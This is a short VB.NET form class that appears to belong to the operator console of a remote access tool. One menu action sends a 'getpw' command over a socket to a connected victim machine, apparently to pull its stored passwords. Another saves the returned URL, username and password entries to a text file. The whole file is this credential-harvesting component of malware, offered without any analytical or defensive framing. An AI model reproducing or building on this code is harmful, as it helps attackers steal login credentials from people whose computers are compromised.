Public Class passwords
    Public sock As Integer
    Private Sub SaveToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SaveToolStripMenuItem.Click
        Dim o As New SaveFileDialog
        o.Filter = "Txtpass|*.Txt"
        If o.ShowDialog = Windows.Forms.DialogResult.OK Then
            For Each ll As ListViewItem In ListView1.Items
                My.Computer.FileSystem.WriteAllText(o.FileName, "URL : " & ll.SubItems(0).Text & " User : " & ll.SubItems(1).Text & "Pass  : " & ll.SubItems(2).Text, True)
            Next
            MsgBox("Done", MsgBoxStyle.Information, "")
        End If
    End Sub
    Private Sub DownloadToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DownloadToolStripMenuItem.Click
        Main.S.Send(sock, "getpw")
    End Sub
End Class